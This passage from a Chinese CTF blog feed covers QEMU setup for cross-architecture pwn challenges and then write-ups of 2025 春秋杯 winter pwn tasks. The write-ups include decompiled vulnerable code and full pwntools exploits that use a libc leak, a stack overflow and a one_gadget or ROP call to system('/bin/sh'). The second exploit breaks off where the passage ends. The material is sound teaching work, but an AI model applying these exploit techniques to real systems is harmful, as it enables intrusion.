title="编译"></a>编译</h3><p>编译<code>powerpc</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$powerpc</span>-linux-gnu-gcc ./test.c <span class="token parameter variable">-o</span> hello<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h2><h3 id="环境安装-1"><a href="#环境安装-1" class="headerlink" title="环境安装"></a>环境安装</h3><p>mips 和 mips64 大端序：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-mips-linux-gnu g++-mips-linux-gnu libc6-dbg-mips-cross<span class="token variable">$sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-mips64-linux-gnuabi64 g++-mips64-linux-gnuabi64 libc6-dbg-mips64-cross<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>小端序：<strong>qemu-mipsel</strong> &#x2F; qemu-mips64el</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sudo</span> <span class="token function">apt</span> <span class="token function">install</span> libc6-mipsel-cross<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="运行-3"><a href="#运行-3" class="headerlink" title="运行"></a>运行</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-mipsel <span class="token parameter variable">-L</span> /usr/mipsel-linux-gnu ./SuperCgi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'mips'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-mipsel"</span><span class="token punctuation">,</span><span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="调试-3"><a href="#调试-3" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-none"><code class="language-none">gdb-multiarch -q .&#x2F;pwnset architecture mipsset endian littletarget remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编译-1"><a href="#编译-1" class="headerlink" title="编译"></a>编译</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">mipsel-linux-gnu-gcc test.c <span class="token parameter variable">-o</span> <span class="token builtin class-name">test</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="riscv"><a href="#riscv" class="headerlink" title="riscv"></a>riscv</h2><h3 id="riscv64环境配置"><a href="#riscv64环境配置" class="headerlink" title="riscv64环境配置"></a>riscv64环境配置</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> gcc-riscv64-linux-gnu g++-riscv64-linux-gnu libc6-dbg-riscv64-cross<span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> <span class="token parameter variable">-y</span> libc6-riscv64-cross binutils-riscv64-linux-gnu gcc-riscv64-linux-gnu<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="运行-4"><a href="#运行-4" class="headerlink" title="运行"></a>运行</h3><p>在22的机器上</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-riscv64 <span class="token parameter variable">-L</span> /usr/riscv64-linux-gnu pwn<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'riscv'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"qemu-riscv64"</span><span class="token punctuation">,</span> <span class="token string">"-L"</span><span class="token punctuation">,</span> <span class="token string">"/usr/riscv64-linux-gnu"</span><span class="token punctuation">,</span> <span class="token string">"-g"</span><span class="token punctuation">,</span><span class="token string">"1234"</span><span class="token punctuation">,</span> file_name<span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="调试-4"><a href="#调试-4" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb-multiarch <span class="token parameter variable">-q</span> ./pwn<span class="token builtin class-name">set</span> architecture riscv<span class="token builtin class-name">set</span> endian littletarget remote localhost:1234<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="hexagon"><a href="#hexagon" class="headerlink" title="hexagon"></a>hexagon</h2><h3 id="运行-5"><a href="#运行-5" class="headerlink" title="运行"></a>运行</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$qemu</span>-hexagon ./chall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="调试-5"><a href="#调试-5" class="headerlink" title="调试"></a>调试</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'qemu-hexagon'</span><span class="token punctuation">,</span> <span class="token string">'-L'</span><span class="token punctuation">,</span> <span class="token string">'libc'</span><span class="token punctuation">,</span> <span class="token string">'-d'</span><span class="token punctuation">,</span> <span class="token string">'in_asm,exec,cpu,nochain'</span><span class="token punctuation">,</span> <span class="token string">'-singlestep'</span><span class="token punctuation">,</span>            <span class="token string">'-dfilter'</span><span class="token punctuation">,</span> <span class="token string">'0x20400+0xc0'</span><span class="token punctuation">,</span> <span class="token string">'-strace'</span><span class="token punctuation">,</span> <span class="token string">'-D'</span><span class="token punctuation">,</span> <span class="token string">'./log'</span><span class="token punctuation">,</span> <span class="token string">'./chall'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="反编译"><a href="#反编译" class="headerlink" title="反编译"></a>反编译</h3><p>下载 hexagon.dll 插件使用 8.3 的 ida.exe 打开 32 位的 QUALCOMM DSP6 程序</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;qemu安装&quot;&gt;&lt;a href=&quot;#qemu安装&quot; class=&quot;headerlink&quot; title=&quot;qemu安装&quot;&gt;&lt;/a&gt;qemu安装&lt;/h2&gt;&lt;p&gt;安装&lt;code&gt;qemu qemu-user qemu-user-static&lt;/code&gt;&lt;/p&gt;
&lt;pr</summary>
      
    
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/categories/pwn/"/>
    
    
    <category term="pwn" scheme="https://starrysky1004.github.io/tags/pwn/"/>
    
    <category term="异构" scheme="https://starrysky1004.github.io/tags/%E5%BC%82%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>2025春秋杯冬季赛pwn方向题解</title>
    <link href="https://starrysky1004.github.io/2025/01/23/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/"/>
    <id>https://starrysky1004.github.io/2025/01/23/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/2025-chun-qiu-bei-dong-ji-sai-pwn-fang-xiang-ti-jie/</id>
    <published>2025-01-23T09:31:39.000Z</published>
    <updated>2025-01-23T10:04:20.005Z</updated>
    
    <content type="html"><![CDATA[<h2 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h2><p>main 函数中输入格式不正确的时候会输出 puts 函数地址，泄露 libc 地址，输入长度为 4 内容为 \x00 的时候会进入 compare 函数</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token operator">&amp;</span>puts<span class="token punctuation">;</span>  <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token punctuation">(</span>__fastcall <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>__int64 <span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">)</span>init_0<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v6<span class="token punctuation">,</span> a2<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>  fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">".BYPASS"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> fd <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x1000uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token char">'\n'</span> <span class="token punctuation">)</span>        buf<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token function">strchr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token char">':'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token punctuation">(</span>v8 <span class="token operator">-</span> buf<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x3F</span> <span class="token punctuation">)</span>          <span class="token punctuation">&#123;</span>            <span class="token operator">*</span>v8 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">strcpy</span><span class="token punctuation">(</span>byte_602140<span class="token punctuation">,</span> v8 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>              <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>              <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">,</span> <span class="token number">4uLL</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span>                  <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>                  <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token punctuation">&#125;</span>              <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>                <span class="token keyword">break</span><span class="token punctuation">;</span>              <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>          <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>漏洞点在 compare 函数中，两次 read 都是向 buf 读取并且长度都是 0x200，第一次读取会复制到 KEY 中，第二次读取会复制到 VAL 中，而离 rbp 最近的 VAL 距离也超过 0x200，但是从 buf 复制的过程是遇 \x00 停止，所以可以从 buf 一直复制到 KEY，加起来就超过 0x200 了，但是在覆盖到 ret 的过程中还需要注意 rbp-2h 是复制的 index，要合理控制这个 i 让复制过程正确进行</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">compare</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">ssize_t</span> v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-610h] BYREF</span>  <span class="token keyword">char</span> KEY<span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+200h] [rbp-410h] BYREF</span>  <span class="token keyword">char</span> VAL<span class="token punctuation">[</span><span class="token number">526</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+400h] [rbp-210h] BYREF</span>  __int16 i<span class="token punctuation">;</span> <span class="token comment">// [rsp+60Eh] [rbp-2h]</span>  <span class="token function">memset</span><span class="token punctuation">(</span>VAL<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>KEY<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>KEY<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"KEY: "</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v0 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>        KEY<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      KEY<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>      <span class="token function">memset</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> v0 <span class="token operator">>=</span> <span class="token number">0</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token function">LODWORD</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token string">"VAL: "</span><span class="token punctuation">,</span> <span class="token number">5uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>v0 <span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>            VAL<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> buf<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'39.106.48.123'</span><span class="token punctuation">,</span> <span class="token number">44314</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">get_libc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> u64<span class="token punctuation">(</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'abcd'</span><span class="token punctuation">)</span>puts_addr <span class="token operator">=</span> get_libc<span class="token punctuation">(</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.27.so'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\x00\x00\x00\x00'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'KEY: '</span> <span class="token operator">+</span> <span class="token string">b'c'</span> <span class="token operator">*</span> <span class="token number">19</span> <span class="token operator">+</span> <span class="token string">b'\x13\x02'</span> <span class="token operator">+</span> <span class="token string">b'aaaaaaaa'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4f302</span> <span class="token operator">+</span> libc_base<span class="token punctuation">)</span>p <span class="token operator">=</span> p<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'a'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">b'VAL: '</span> <span class="token operator">+</span> <span class="token string">b'b'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x200</span> <span class="token operator">-</span> <span class="token number">0x5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gender-simulation"><a href="#gender-simulation" class="headerlink" title="gender_simulation"></a>gender_simulation</h2><p>菜单里就给了 libc 地址，这题直接测试发现在输入 2 2 之后再输入可以直接劫持程序流，有个后门是性别为购物袋，存在栈溢出漏洞，直接溢出写 rop 链执行 system(‘&#x2F;bin&#x2F;sh’)</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">gender</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  _BYTE buf<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-10h] BYREF</span>  v0 <span class="token operator">=</span> std<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token operator">&lt;</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">(</span>         <span class="token operator">&amp;</span>std<span class="token operator">::</span>cout<span class="token punctuation">,</span>         <span class="token string">"If you think you are a shopping bag, please leave your gender certificate"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>ostream<span class="token operator">::</span>operator<span class="token operator">&lt;&lt;</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>std<span class="token operator">::</span>endl<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token punctuation">,</span>std<span class="token operator">::</span>char_traits<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">>></span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'47.94.84.92'</span><span class="token punctuation">,</span> <span class="token number">30857</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span 